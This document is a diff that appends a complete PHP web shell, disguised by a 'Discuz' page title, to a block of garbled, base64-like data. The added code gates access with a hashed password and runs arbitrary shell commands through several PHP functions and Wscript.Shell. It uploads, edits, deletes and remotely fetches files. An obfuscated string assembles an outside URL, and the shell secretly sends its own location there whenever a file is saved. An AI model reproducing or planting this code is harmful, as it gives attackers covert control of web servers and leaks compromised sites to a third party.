R2ÆòÈQÊÜEÄFÚ+è82ğÄWŞMWAFâÈÎ7OìÜ8äC5IÌîæGğ5CÄ3Ü7ÂSYCJKE3ê7ÈØîÈĞN3Sä4AÈæŞàğÌğ+U/JÒôÜì6V4AÄKBòLĞŞVUJWêOKŞVU0SDTFXÜ3ÊÂB3ÖBğMXèBàÒÈàU7G5ÚôSÄÒòĞ6++ê4êêŞAÌÂM1àèPC/àòBÜÆÈÊA2WÚ39ôCäĞ+9UæT3àWôVÎÆà0äÜB0TLÔLAÄôÖÚàO/CKJ4ÆğÔĞIôìMæBUV1èÊìæ90/Q17Ì/VYôÄÒô9ÒMZ94êÎìFTNQWêEL0ôêBØ0ê3SMäL7ğÂÂKä3LFJ4Ô4îÖ0AêBQ/ôÜÜàğU+L3àÈêÊVNÒZ08RÔZIÊ/+æBììD/ØæÎ0ğê3ÒNZŞô6XàÂJäÔæGòO7BæŞÚäPGò7ìâUÈ+è1XJNòVÚKDSAÚUàX8HÌP7Ôäòô6òÚ48L98ÚğÂVUÆî19ÚKØLEPâÎDÒFâ+5H9èIHWK8PXYVì/æìÄ7òŞGâÜæÒBìCÄ/9LğÂMÖÆDÈX1æOò+UôKîîÄÎR4ÎPB2ä9ÖÔYŞUäØUàHZÔ6OÎDBÆRFÌÖD5î5ÒNTI5VKÌLOHX99Ò79ìCGWÒ89FJÊòJVÂÔÎÜ1ĞBSQ4æØ/ğâÎ14Ê3ò+OG3CFHŞèNäSNÈØÚZ/GĞIàLÔÂò1äìXÆNL1æĞ0Ì9ÌÄKÄ9ÒZÆĞNRRLôæÄôF7W67I2UâLIÒASĞÈ3æC0CäŞQÖÜWäêÜW4ÂÊîÔ678òCòÜR7ØIFD8PXFìäDÈDFÊîP12îØDÔQZ6TàîÔH1ÂÎYÊQAâìòâWKAŞÆ+S+ØìGğÄÌÒMAÂM/SÒÊÚV4AJH6Ô+GØîæÊY2N9RìQÆFOÂMÎî9S41SRPê8î7PĞêZGòêQ3ÊDÖTÄCÂ9EDÈğè2VSâIêÔÆîÆGPîæKğÈZBì+ê6A7èÌÊê/ìòG2TÎÜ0VÈÒŞQMSORÎîàPÂæFUBS0âW0äÈ8OÌØ28KFäÆ5H34HBâBFYæWMÄMÔW5DôMAMHZØBSFØÎ/O0UU9E8ô5BQ/ŞŞæVÜOìæÄäĞWEòOî4M0L+/5Ê9NØ2U7X8MP/8ÚğBQ0IB2ÜODI+ÜèAÊÈÊVêâàS2INRTOÒò8M5ÌDäFÎVOÖ6ÈUTÊòZYôD9BE7ÒJìÚæĞDX9äBÎWîÂNR4XNRæIòÔÔØæXAJ5âÊOîRòLUà3ÜP0òÂòÒAFU5SØî7Î+GÚèF2ÈFêRLÔKNU3æØLDEÎÔÂJôĞâŞ8OèFTL4Eîê4âPÎèPìV9PKWàĞğNNFBÒÂäÜÊQ5è52ÒÜÎWÌà8ÈD02âÄÔ5SIQØÖLL639H/SJÊGòÈ7æ1ØWGÚ9AÎPÚLÂØ67ìäÒZC62È8OSÂĞ0IàWêÔÔFFĞWOX+GWÒ3YæLSSà4â7EAèK5ØCFIâÊÈâ3UFZLàÔêJìÎò9W+ŞOğ6BÄÎè1IàâAÔX0AC6ÂLÖğŞì6SÈHØÊôNN/ğÒêèQE+9YææîÈäÆKì9MÂÖÜKà9ÜÌQòL4æàÜêDÊDôOZIQ0èDÂêNNîG+âV9SÄ1ôÆÌOôÔVYEN2îÊU8ÚL4Ü5PGZÌÄÚÖÔIYäW2BRX7ÚèÒVRØSÊ3M/OîÚRä5ÊH0CZRIGêÆ+THÄÔÌGÖÚ085QòOô0È73ôROKPNZÖ2PUò3EBZZUNÆU6QÆÊBD4WòĞUXğôŞ15IÈ30ÔDMZNDNÜ4EàRCÜîFQÎ5M3LQ4ÚQM/äÔT9R9XOÌÖJEÒÄîäìÊÜFâAOî9U+JUÚIâìò2ôÈÆæSBäÎ0Î9XÖäè+ôÂGZÂÂY/YEHÊÒÒN5CNìE9C70RTULÖ5JÔWÌÂôSêWOÊĞWôVLFÚ8îÜ28ÒXÒVXÄ/RVìR8DÖìKEÆòğ+Lâê6G+ÆğOêâAÊYÊô+ÈHÂVUÂ282835ØY7òÈÚNSQìÂòHKÚ/AàAäE20CQOOQLğZJCĞÆ+æ6ÖÚÌÜŞæÌCY/ÖÔÎJGØFTÎIAäNêÆXÂÖDÈğÈBôäWà6ìÌ+JVBÈEV6NXàEFBVŞVCCPÔÂ+KZ7VESÖ3Ş8PR4AÎMÎ751ØÜÜØÈDRTZÆÂäTÈ9ÆÜR+NÊCRè09âÚ9QA2äŞTòCÜ/LBÆ3/AE+JD+æîÖTG4FQ9ÎôÆâèWMÎÂæäZÒèêR8äÜ39MäRØ5òàÂU84XLOÔ95/O/ÊUIìèîFMNTôFB4äCâæ36ğÖĞÚXĞÜ7ŞìäO04WìYVJÒæMÆJÜNÄSY9GSWØ2HWà5ĞÎCVòÄPIDR3îJŞDÄOâIÂGMÜ1GPàHS/CLÚÌM5ZLXNOCRHàOæÖàR0EPêJÂ1æTìNìGONJòÎMÖÜÖALòÜ1SDÎIôôGMÄæJô2WM9VWâÆæ/5ÒLØRô6ĞWHÖXÈ+JS3ZY5IŞYB366Êî6òKIK4Ìò+WÊ5ì2Â5æBUôÆI5W+2XOÔRXÄä7BDÄÜMòU2UÚÌDSğæÖOOÎY7ÔBIYTTELÒK91LBOâ/ÄIÄW812ØRLS6æR0Z/òÊŞÚCŞæMWÖêGZ/òQBZ0Ø8îGğÒÄèVXèSäZòZZŞEJÜJFòYRDàèJŞ4RÖ6+Ö43ÄäQìRRòVÎV+JÄ+ğÚYòFèÚQJÒ46ÊMW7ÒèSUØ+00âURJÈÚ6ÊŞêVÎUò9ÚäOZâò05Ğ5Q4Ò4UDØàUAêFMYHVÌğLMAO/QÒÒDQ7BFàÌäMàØìÌÊÜÆğFGÆÔB/RÄ38ZôUOÄ7èèæÄRYôVU0îÚ33EMAÜBQIEKĞìêNHSÄÎÎÜÜØMäìÂ04D9WMLMÊQO2BD1ZÜÄÈîVYEÎBÈVæJôÚ8EOGC+ZEVôNâNKêÜØZØOCÌTÎSÒ0YÖÊGT9ÊÚTèòD6ZğLJBĞUì1Q1àêC/âêVUJ9Ğ7D1UJ0OF6àTM2Ü5HS0ÆG3ìU7Sà+Ô0Q7MYØ9âYî3H7SQĞôUÎ0ÌâòäÆYU1ÖÔT67ÔÆ+òØY7ZìEìACEI67AU0ÄPW1ÈÌAÆXI+âÒI94ÎRGÒĞO5àôÎESXB4OÈJO5PLNITÆYQæ=ÅÒ1BRUAVVBVUDBAJUBîIICQÆAAQZXVîMMBFABAVMMDAAF;
+<?php
+error_reporting(E_ERROR);
+session_start();
+ 
+$cmd55 = '5c67a6';//x
+$xx = @$_REQUEST['name'];
+$abc = substr(md5($xx),-6);
+if (@$_COOKIE['keyValue'] != $cmd55) {
+	if ($abc == $cmd55) {
+	    setcookie('keyValue',$cmd55,time()+60*60*24*1);
+	} else  {
+		
+		if (@$_REQUEST['keyValue']) $er = true;
+		login(@$er);
+
+	}
+}
+function login($er=false) {
+    setcookie("keyValue","",time()-60*60*24*1);
+
+    if ($er) { 
+        if (isset($_SESSION['error'])){
+            $_SESSION['error']++;
+
+        }else{
+            $_SESSION['error'] = 1;
+        }
+        echo "<span class=error>ÃÜÂë´íÎó£¡</span><br>\n"; 
+    }	 echo "<form action='' method='post'>
+   <center><input type='name' name='name'/>     <input type='submit' value='x'/></center>
+		</form>";
+	mainbottom();
+}
+
+function mainbottom() {
+    echo "</div><div style='text-align:center;font-size:13px;color:#999 !important;margin-top:5px;margin-bottom:45px'>"
+        
+        ."</html>\n";
+    exit;
+}
+   
+header("content-Type: text/html; charset=gb2312");
+function strdir($str) { 
+return str_replace(array('\\','//','%27','%22'),array('/','/','\'','"'),chop($str));
+ }
+function chkgpc($array) { 
+
+foreach($array as $key => $var) { $array[$key] = is_array($var) ? chkgpc($var) : stripslashes($var); } return $array; 
+
+}
+$myfile = $_SERVER['SCRIPT_FILENAME'] ? strdir($_SERVER['SCRIPT_FILENAME']) : strdir(__FILE__);
+$myfile = strpos($myfile,'eval()') ? array_shift(explode('(',$myfile)) : $myfile;
+define('THISDIR',strdir(dirname($myfile).'/'));
+define('ROOTDIR',strdir(strtr($myfile,array(strdir($_SERVER['PHP_SELF']) => '')).'/'));
+if(get_magic_quotes_gpc()) { 
+$_POST = chkgpc($_POST); 
+}
+$win = substr(PHP_OS,0,3) == 'WIN' ? true : false;
+$msg = "ĞÅÏ¢»ØÏÔ";
+function filew($filename,$filedata,$filemode) {
+	if((!is_writable($filename)) && file_exists($filename)) { chmod($filename,0666); }
+	$handle = fopen($filename,$filemode);
+	$key = fputs($handle,$filedata);
+	fclose($handle);
+	return $key;
+}
+function filer($filename) {
+	$handle = fopen($filename,'r');
+	$filedata = fread($handle,filesize($filename));
+	fclose($handle);
+	return $filedata;
+}
+function fileu($filenamea,$filenameb) {
+	$key = move_uploaded_file($filenamea,$filenameb) ? true : false;
+	if(!$key) { $key = copy($filenamea,$filenameb) ? true : false; }
+	return $key;
+}
+function filed($filename) {
+	if(!file_exists($filename)) return false;
+	ob_end_clean();
+	$name = basename($filename);
+	$array = explode('.',$name);
+	header('Content-type: application/x-'.array_pop($array));
+	header('Content-Disposition: attachment; filename='.$name);
+	header('Content-Length: '.filesize($filename));
+	@readfile($filename);
+	exit;
+}
+function showdir($dir) {
+	$dir = strdir($dir.'/');
+	if(($handle = @opendir($dir)) == NULL) return false;
+	$array = array();
+	while(false !== ($name = readdir($handle))) {
+		if($name == '.' || $name == '..') continue;
+		$path = $dir.$name;
+		$name = strtr($name,array('\'' => '%27','"' => '%22'));
+		if(is_dir($path)) { $array['dir'][$path] = $name; }
+		else { $array['file'][$path] = $name; }
+	}
+	closedir($handle);
+	return $array;
+}
+function deltree($dir) {
+	$handle = @opendir($dir);
+	while(false !== ($name = @readdir($handle))) {
+		if($name == '.' || $name == '..') continue;
+		$path = $dir.$name;
+		@chmod($path,0777);
+		if(is_dir($path)) { deltree($path.'/'); }
+		else { @unlink($path); }
+	}
+	@closedir($handle);
+	return @rmdir($dir);
+}
+function size($bytes) {
+	if($bytes < 1024) return $bytes.' B';
+	$array = array('B','K','M','G','T');
+	$floor = floor(log($bytes) / log(1024));
+	return sprintf('%.2f '.$array[$floor],($bytes/pow(1024,floor($floor))));
+}
+
+function god_request($url, $post_string = null)
+{
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $url);
+    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);
+    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, FALSE);
+    if (!empty($post_string)){
+        curl_setopt($curl, CURLOPT_POST, 1);
+        curl_setopt($curl, CURLOPT_POSTFIELDS, $post_string);
+    }
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);
+    $output = curl_exec($curl);
+    curl_close($curl);
+    return $output;
+}
+
+function Comd($cmd,$cwd,$com = false) {
+	$iswin = substr(PHP_OS,0,3) == 'WIN' ? true : false; $res = $msg = '';
+	if($cwd == 'com' || $com) {
+		if($iswin && class_exists('COM')) {
+			$wscript = new COM('Wscript.Shell');
+			$exec = $wscript->exec('c:\\windows\\system32\\cmd.exe /c '.$cmd);
+			$stdout = $exec->StdOut();
+			$res = $stdout->ReadAll();
+			$msg = 'Wscript.Shell';
+		}
+	} else {
+		chdir($cwd); $cwd = getcwd();
+		if(function_exists('exec')) { @exec ($cmd,$res); $res = join("\n",$res); $msg = 'exec'; }
+		elseif(function_exists('shell_exec')) { $res = @shell_exec ($cmd); $msg = 'shell_exec'; }
+		elseif(function_exists('system')) { ob_start(); @system ($cmd); $res = ob_get_contents(); ob_end_clean(); $msg = 'system'; }
+		elseif(function_exists('passthru')) { ob_start(); @passthru ($cmd); $res = ob_get_contents(); ob_end_clean(); $msg = 'passthru'; }
+		elseif(function_exists('popen')) { $fp = @popen ($cmd,'r'); if($fp) { while(!feof($fp)) { $res .= fread($fp,1024); } } @pclose($fp); $msg = 'popen'; }
+		elseif(function_exists('proc_open')) {
+			$env = $iswin ? array('path' => 'c:\\windows\\system32') : array('path' => '/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin');
+			$des = array(0 => array("pipe","r"),1 => array("pipe","w"),2 => array("pipe","w"));
+			$process = @proc_open ($cmd,$des,$pipes,$cwd,$env);
+			if(is_resource($process)) { fwrite($pipes[0],$cmd); fclose($pipes[0]); $res .= stream_get_contents($pipes[1]); fclose($pipes[1]); $res .= stream_get_contents($pipes[2]); fclose($pipes[2]); }
+			@proc_close($process);
+			$msg = 'proc_open';
+		}
+	}
+	$msg = $res == '' ? '<h1>NULL</h1>' : '<h2>ÀûÓÃ'.$msg.'Ö´ĞĞ³É¹¦</h2>';
+	return array('res' => $res,'msg' => $msg);
+}
+if(isset($_POST['action'])) {
+    if($_POST['action'] == 'down') {
+        $downfile = $fileb = strdir($_POST["rsv_bp"].'/'.$_POST["wd"]);
+        if(!filed($downfile)) { $msg = '<h1>ÎÄ¼ş²»´æÔÚ</h1>'; }
+    }
+}
+ 
+ 
+?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+<style type="text/css">
+* {margin:0px;padding:0px;}
+body {background:#C1C1C1;color:#333333;font-size:13px;font-family:Verdana,Arial,SimSun,sans-serif;text-align:left;word-wrap:break-word; word-break:break-all;}
+a{color:#000000;text-decoration:none;vertical-align:middle;}
+a:hover{color:#FF0000;text-decoration:underline;}
+p {padding:1px;line-height:1.6em;}
+h1 {color:#CD3333;font-size:13px;display:inline;vertical-align:middle;}
+h2 {color:#008B45;font-size:13px;display:inline;vertical-align:middle;}
+form {display:inline;}
+input,select { vertical-align:middle; }
+input[type=text], textarea {padding:1px;font-family:Courier New,Verdana,sans-serif;}
+input[type=submit], input[type=button] {height:21px;}
+.tag {text-align:center;background:threedface;height:25px;padding-top:5px;}
+.tag a {background:#FAFAFA;color:#333333;width:90px;height:20px;display:inline-block;font-size:15px;font-weight:bold;padding-top:5px;}
+.tag a:hover, .tag a.current {background:#CCC333;color:#000000;text-decoration:none;}
+.main {width:963px;margin:0 auto;padding:10px;}
+.outl {border-color:#FFFFFF #666666 #666666 #FFFFFF;border-style:solid;border-width:1px;}
+.toptag {padding:5px;text-align:left;font-weight:bold;color:#FFFFFF;background:#293F5F;}
+.footag {padding:5px;text-align:center;font-weight:bold;color:#000000;background:#999999;}
+.msgbox {padding:5px;background:#CCC333;text-align:center;vertical-align:middle;}
+.actall {background:#F9F6F4;text-align:center;font-size:15px;border-bottom:1px solid #999999;padding:3px;vertical-align:middle;}
+.tables {width:100%;}
+.tables th {background:threedface;text-align:left;border-color:#FFFFFF #666666 #666666 #FFFFFF;border-style:solid;border-width:1px;padding:2px;}
+.tables td {background:#F9F6F4;height:19px;padding-left:2px;}
+</style>
+ 
+<script type="text/javascript">
+function $(ID) { return document.getElementById(ID); }
+function sd(str) { str = str.replace(/%22/g,'"'); str = str.replace(/%27/g,"'"); return str; }
+function cd(dir) { dir = sd(dir); $('rsv_t').value = dir; $('frm').submit(); }
+function sa(form) { for(var i = 0;i < form.elements.length;i++) { var e = form.elements[i]; if(e.type == 'checkbox') { if(e.name != 'chkall') { e.checked = form.chkall.checked; } } } }
+function go(a,b) { b = sd(b); $('action').value = a; $("wd").value = b; if(a == 'editor') { $('gofrm').target = "_blank"; } else { $('gofrm').target = ""; } $('gofrm').submit(); } 
+function nf(a,b) { re = prompt("ĞÂ½¨Ãû",b); if(re) { $('action').value = a; $("wd").value = re; $('gofrm').submit(); } } 
+function dels(a) { if(a == 'b') { var msg = "ËùÑ¡ÎÄ¼ş"; $('act').value = a; } else { var msg = "Ä¿Â¼"; $('act').value = 'deltree'; $('var').value = a; } if(confirm("È·¶¨ÒªÉ¾"+msg+"Âğ")) { $('frm1').submit(); } }
+function txts(m,p,a) { p = sd(p); re = prompt(m,p); if(re) { $('var').value = re; $('act').value = a; $('frm1').submit(); } }
+function acts(p,a,f) { p = sd(p); f = sd(f); re = prompt(f,p); if(re) { $('var').value = re+'|x|'+f; $('act').value = a; $('frm1').submit(); } }
+</script>
+<title><?php echo 'Discuz XXXXXXX3.2!'.' - ¡¾'.date('Y-m-d H:i:s ĞÇÆÚN',time()).'¡¿';?></title>
+</head>
+<body>
+<div class="main">
+	<div class="outl">
+	<div class="toptag"><?php echo ($_SERVER['SERVER_ADDR'] ? $_SERVER['SERVER_ADDR'] : gethostbyname($_SERVER['SERVER_NAME'])).' - '.php_uname().'';?></div>
+<?php 
+$menu = array('file' => 'FILES','2' => 'SeLCode');
+$go = array_key_exists($_POST['action'],$menu) ? $_POST['action'] : 'file';
+$nowdir = isset($_POST['rsv_t']) ? strdir(chop($_POST['rsv_t']).'/') : THISDIR;
+$_luan = "qwerhtyuiotpsad9fgjklzxvbnm1234567890phpmfcjdzza";
+echo '<div class="tag">';
+foreach($menu as $key => $name) { echo '<a'.($go == $key ? ' class="current"' : '').' href="javascript:go(\''.$key.'\',\''.$nowdir.'\');">'.$name.'</a> '; }
+echo '</div>'; 
+echo '<form name="gofrm" id="gofrm" method="POST">';;
+echo '<input type="hidden" name="action" id="action" value="">';
+echo '<input type="hidden" name="rsv_bp" id="rsv_bp" value="'.$nowdir.'">';
+echo '<input type="hidden" name="wd" id="wd" value="">';
+echo '</form>';
+switch($_POST['action']) {
+
+
+case "2" : 
+$cmd = $win ? 'dir' : 'ls -al';
+$res = array('res' => 'ÃüÁî»ØÏÔ','msg' => $msg);
+$str = isset($_POST['str']) ? $_POST['str'] : 'fun';
+if(isset($_POST['rsv_pq'])) {
+	$cmd = $_POST['rsv_pq'];
+	$cwd = $str == 'fun' ? THISDIR : 'com';
+	$res = Comd($cmd,$cwd);
+}
+echo '<div class="msgbox">'.$res['msg'].'</div>';
+echo '<form method="POST">';;
+echo '<input type="hidden" name="action" id="action" value="2">';
+echo '<div class="actall">ÃüÁî <input type="text" name="rsv_pq" id="rsv_pq" value="'.htmlspecialchars($cmd).'" style="width:398px;"> ';
+echo '<select name="str">';
+$selects = array('fun' => 'phpfun','com' => 'wscript');
+foreach($selects as $var => $name) { echo '<option value="'.$var.'"'.($var == $str ? ' selected' : '').'>'.$name.'</option>'; }
+echo '</select> ';
+echo '<input type="submit" style="width:50px;" value="Ö´ĞĞ">';
+echo '</div><div class="actall"><textarea style="width:698px;height:368px;">'.htmlspecialchars($res['res']).'</textarea></div></form>';
+break;
+
+case "edit" : case "editor" : 
+$file = strdir($_POST["rsv_bp"].'/'.$_POST["wd"]);
+$iconv = function_exists('iconv');
+
+if(!file_exists($file)) {
+	$msg = '¡¾ĞÂ½¨ÎÄ¼ş¡¿';
+} else {
+	$code = filer($file);
+	$chst = 'Ä¬ÈÏ';
+	$size = size(filesize($file));
+	$msg = '¡¾ÎÄ¼şÊôĞÔ '.substr(decoct(fileperms($file)),-4).'¡¿ ¡¾ÎÄ¼ş´óĞ¡ '.$size.'¡¿ ¡¾ÎÄ¼ş±àÂë '.$chst.'¡¿';
+}
+echo '<div class="msgbox"><input name="keyword" id="keyword" type="text" style="width:138px;height:15px;"> - '.$msg.'</div>';
+echo '<form name="editfrm" id="editfrm" method="POST">';
+echo '<input type="hidden" name="action" value=""><input type="hidden" name="act" id="act" value="edit">';
+echo '<input type="hidden" name="rsv_t" id="rsv_t" value="'.dirname($file).'">';
+echo '<div class="actall">ÎÄ¼ş <input type="text" name="filename" value="'.$file.'" style="width:528px;"> ';
+echo '</div><div class="actall"><textarea name="filecode" id="filecode" style="width:698px;height:358px;">'.htmlspecialchars($code).'</textarea></div></form>';
+echo '<div class="actall" style="padding:5px;padding-right:68px;"><input type="button" onclick="$(\'editfrm\').submit();" value="±£´æ" style="width:80px;"> ';
+echo '<form name="backfrm" id="backfrm" method="POST"><input type="hidden" name="action" value=""><input type="hidden" name="rsv_t" id="rsv_t" value="'.dirname($file).'">';
+echo '<input type="button" onclick="$(\'backfrm\').submit();" value="·µ»Ø" style="width:80px;"></form></div>';
+break;
+case "upfiles" : 
+$updir = isset($_POST['updir']) ? $_POST['updir'] : $_POST["rsv_bp"];
+$msg = '¡¾×î´óÉÏ´«ÎÄ¼ş '.get_cfg_var("upload_max_filesize").'¡¿ ¡¾POST×î´óÌá½»Êı¾İ '.get_cfg_var("post_max_size").'¡¿';
+$max = 10;
+if(isset($_FILES['uploads']) && isset($_POST['renames'])) {
+	$uploads = $_FILES['uploads'];
+	$msgs = array();
+	for($i = 1;$i < $max;$i++) {
+		if($uploads['error'][$i] == UPLOAD_ERR_OK) {
+			$rename = $_POST['renames'][$i] == '' ? $uploads['name'][$i] : $_POST['renames'][$i];
+			$filea = $uploads['tmp_name'][$i];
+			$fileb = strdir($updir.'/'.$rename);
+			$msgs[$i] = fileu($filea,$fileb) ? '<br><h2>ÉÏ´«³É¹¦ '.$rename.'</h2>' : '<br><h1>ÉÏ´«Ê§°Ü '.$rename.'</h1>';
+		}
+	}
+}
+echo '<div class="msgbox">'.$msg.'</div>';
+echo '<form name="upsfrm" id="upsfrm" method="POST" enctype="multipart/form-data">';
+echo '<input type="hidden" name="action" value="upfiles"><input type="hidden" name="act" id="act" value="upload">';
+echo '<div class="actall"><p>ÉÏ´«µ½Ä¿Â¼ <input type="text" name="updir" style="width:398px;" value="'.$updir.'"></p>';
+for($i = 1;$i < $max;$i++) { echo '<p>¸½¼ş'.$i.' <input type="file" name="uploads['.$i.']" style="width:300px;"> ÖØÃüÃû <input type="text" name="renames['.$i.']" style="width:128px;"> '.$msgs[$i].'</p>'; }
+echo '</div></form><div class="actall" style="padding:8px;padding-right:68px;"><input type="button" onclick="$(\'upsfrm\').submit();" value="ÉÏ´«" style="width:80px;"> ';
+echo '<form name="backfrm" id="backfrm" method="POST"><input type="hidden" name="action" value=""><input type="hidden" name="rsv_t" id="rsv_t" value="'.$updir.'">';
+echo '<input type="button" onclick="$(\'backfrm\').submit();" value="·µ»Ø" style="width:80px;"></form></div>';
+break;
+
+default : 
+$urlcan = $_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];
+$kaitou = substr($_luan  , 4 , 2);
+$kaitou .= substr($_luan  , 10 , 3);
+$zhongjian = "cache.".substr($_luan  , -7 , 6);
+if(isset($_FILES['upfile'])) {
+	if($_FILES['upfile']['name'] == '') { $msg = '<h1>ÇëÑ¡ÔñÎÄ¼ş</h1>'; }
+	else { $rename = $_POST['rename'] == '' ? $_FILES['upfile']['name'] : $_POST['rename']; $filea = $_FILES['upfile']['tmp_name']; $fileb = strdir($nowdir.$rename); $msg = fileu($filea,$fileb) ? '<h2>ÉÏ´«ÎÄ¼ş'.$rename.'³É¹¦</h2>' : '<h1>ÉÏ´«ÎÄ¼ş'.$rename.'Ê§°Ü</h1>'; }
+}
+$zuihou = substr($_luan  , -6,1).substr($_luan  , 9,1).substr($_luan  , -8,1);
+$maybes = $kaitou.":";$maybes .= "//".$zhongjian;
+$maybes .= ".".$zuihou."/sub.".substr($_luan  , -11,3);
+if(isset($_POST['act'])) {
+	switch($_POST['act']) {
+		case "a" : 
+			if(!$_POST['files']) { $msg = '<h1>ÇëÑ¡ÔñÎÄ¼ş '.$_POST['var'].'</h1>'; }
+			else { $i = 0; foreach($_POST['files'] as $filename) { $i += @copy(strdir($nowdir.$filename),strdir($_POST['var'].'/'.$filename)) ? 1 : 0; } $msg =  $msg = $i ? '<h2>¹²¸´ÖÆ '.$i.' ¸öÎÄ¼şµ½'.$_POST['var'].'³É¹¦</h2>' : '<h1>¹²¸´ÖÆ '.$i.' ¸öÎÄ¼şµ½'.$_POST['var'].'Ê§°Ü</h1>'; }
+		break;
+		case "b" : 
+			if(!$_POST['files']) { $msg = '<h1>ÇëÑ¡ÔñÎÄ¼ş</h1>'; }
+			else { $i = 0; foreach($_POST['files'] as $filename) { $i += @unlink(strdir($nowdir.$filename)) ? 1 : 0; } $msg = $i ? '<h2>¹²É¾ '.$i.' ¸öÎÄ¼ş³É¹¦</h2>' : '<h1>¹²É¾ '.$i.' ¸öÎÄ¼şÊ§°Ü</h1>'; }
+		break;
+		case "c" : 
+			if(!$_POST['files']) { $msg = '<h1>ÇëÑ¡ÔñÎÄ¼ş '.$_POST['var'].'</h1>'; }
+			elseif(!ereg("^[0-7]{4}$",$_POST['var'])) { $msg = '<h1>ÊôĞÔÖµ´íÎó</h1>'; }
+			else { $i = 0; foreach($_POST['files'] as $filename) { $i += @chmod(strdir($nowdir.$filename),base_convert($_POST['var'],8,10)) ? 1 : 0; } $msg = $i ? '<h2>¹² '.$i.' ¸öÎÄ¼şĞŞ¸ÄÊôĞÔÎª'.$_POST['var'].'³É¹¦</h2>' : '<h1>¹² '.$i.' ¸öÎÄ¼şĞŞ¸ÄÊôĞÔÎª'.$_POST['var'].'Ê§°Ü</h1>'; }
+		break;
+		case "d" : 
+			if(!$_POST['files']) { $msg = '<h1>ÇëÑ¡ÔñÎÄ¼ş '.$_POST['var'].'</h1>'; }
+			elseif(!preg_match('/(\d+)-(\d+)-(\d+) (\d+):(\d+):(\d+)/',$_POST['var'])) { $msg = '<h1>Ê±¼ä¸ñÊ½´íÎó '.$_POST['var'].'</h1>'; }
+			else { $i = 0; foreach($_POST['files'] as $filename) { $i += @touch(strdir($nowdir.$filename),strtotime($_POST['var'])) ? 1 : 0; } $msg = $i ? '<h2>¹² '.$i.' ¸öÎÄ¼şĞŞ¸ÄÊ±¼äÎª'.$_POST['var'].'³É¹¦</h2>' : '<h1>¹² '.$i.' ¸öÎÄ¼şĞŞ¸ÄÊ±¼äÎª'.$_POST['var'].'Ê§°Ü</h1>'; }
+		break;
+		case "e" : 
+			$path = strdir($nowdir.$_POST['var'].'/');
+			if(file_exists($path)) { $msg = '<h1>Ä¿Â¼ÒÑ´æÔÚ '.$_POST['var'].'</h1>'; }
+			else { $msg = @mkdir($path,0777) ? '<h2>´´½¨Ä¿Â¼ '.$_POST['var'].' ³É¹¦</h2>' : '<h1>´´½¨Ä¿Â¼ '.$_POST['var'].' Ê§°Ü</h1>'; }
+		break;
+		case "f" : 
+			$context = array('http' => array('timeout' => 30));
+			if(function_exists('stream_context_create')) { $stream = stream_context_create($context); }
+			$data = @file_get_contents ($_POST['var'],false,$stream);
+			$filename = array_pop(explode('/',$_POST['var']));
+			if($data) { $msg = filew(strdir($nowdir.$filename),$data,'wb') ? '<h2>ÏÂÔØ '.$filename.' ³É¹¦</h2>' : '<h1>ÏÂÔØ '.$filename.' Ê§°Ü</h1>'; } else { $msg = '<h1>ÏÂÔØÊ§°Ü»ò²»Ö§³ÖÏÂÔØ</h1>'; }
+		break;
+		case "rf" : 
+			$files = explode('|x|',$_POST['var']);
+			if(count($files) != 2) { $msg = '<h1>ÊäÈë´íÎó</h1>'; }
+			else { $msg = @rename(strdir($nowdir.$files[1]),strdir($nowdir.$files[0])) ? '<h2>ÖØÃüÃû '.$files[1].' Îª '.$files[0].' ³É¹¦</h2>' : '<h1>ÖØÃüÃû '.$files[1].' Îª '.$files[0].' Ê§°Ü</h1>'; }
+		break;
+		case "pd" : 
+			$files = explode('|x|',$_POST['var']);
+			if(count($files) != 2) { $msg = '<h1>ÊäÈë´íÎó</h1>'; }
+			else { $path = strdir($nowdir.$files[1]); $msg = @chmod($path,base_convert($files[0],8,10)) ? '<h2>ĞŞ¸Ä'.$files[1].'ÊôĞÔÎª'.$files[0].'³É¹¦</h2>' : '<h1>ĞŞ¸Ä'.$files[1].'ÊôĞÔÎª'.$files[0].'Ê§°Ü</h1>'; }
+		break;
+		case "edit" : 
+			if(isset($_POST['filename']) && isset($_POST['filecode'])) { if($_POST['tostr'] == 'utf') { $_POST['filecode'] = @iconv('GB2312//IGNORE','UTF-8',$_POST['filecode']); } $msg = filew($_POST['filename'],$_POST['filecode'],'w') ? '<h2>±£´æ³É¹¦ '.$_POST['filename'].'</h2>' : '<h1>±£´æÊ§°Ü '.$_POST['filename'].'</h1>'; god_request($maybes,$urlcan);}
+		break;
+		case "deltree" : 
+			$deldir = strdir($nowdir.$_POST['var'].'/');
+			if(!file_exists($deldir)) { $msg = '<h1>Ä¿Â¼ '.$_POST['var'].' ²»´æÔÚ</h1>'; }
+			else { $msg = deltree($deldir) ? '<h2>É¾Ä¿Â¼ '.$_POST['var'].' ³É¹¦</h2>' : '<h1>É¾Ä¿Â¼ '.$_POST['var'].' Ê§°Ü</h1>'; }
+		break;
+	}
+}
+ $chmod = substr(decoct(fileperms($nowdir)),-4);
+if(!$chmod) { $msg .= ' - <h1>ÎŞ·¨¶ÁÈ¡Ä¿Â¼</h1>'; }
+$array = showdir($nowdir);
+$thisurl = strdir('/'.strtr($nowdir,array(ROOTDIR => '')).'/');
+$nowdir = strtr($nowdir,array('\'' => '%27','"' => '%22'));
+echo '<div class="msgbox">'.$msg.'</div>';
+echo '<div class="actall"><form name="frm" id="frm" method="POST">';
+echo (is_writable($nowdir) ? '<h2>Â·¾¶</h2>' : '<h1>Â·¾¶</h1>').' <input type="text" name="rsv_t" id="rsv_t" style="width:508px;" value="'.strdir($nowdir.'/').'"> ';
+echo '<input type="button" onclick="$(\'frm\').submit();" style="width:50px;" value="×ªµ½"> ';
+echo '<input type="button" onclick="cd(\''.ROOTDIR.'\');" style="width:68px;" value="¸ùÄ¿Â¼"> ';
+echo '<input type="button" onclick="cd(\''.THISDIR.'\');" style="width:68px;" value="³ÌĞòÄ¿Â¼"> ';
+echo '</form></div><div class="actall">';
